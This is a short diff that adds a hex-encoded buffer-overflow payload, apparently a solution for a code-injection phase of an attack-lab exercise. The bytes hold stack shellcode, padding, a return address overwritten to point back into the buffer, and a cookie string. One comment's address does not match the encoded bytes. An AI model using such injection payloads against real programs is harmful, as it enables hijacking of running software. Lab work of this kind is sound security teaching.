@@ -1,0 +1,6 @@
+48 c7 c7 38 76 65 55 68 /* cookie located at 0x55647638 */
+e6 19 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00 /* buffer stops */
+18 76 65 55 00 00 00 00 /* changes return value to buffer
+/*33 35 62 62 64 30 61 38 00  cookie in string converted to hex */
+33 35 62 62 64 30 61 38 00
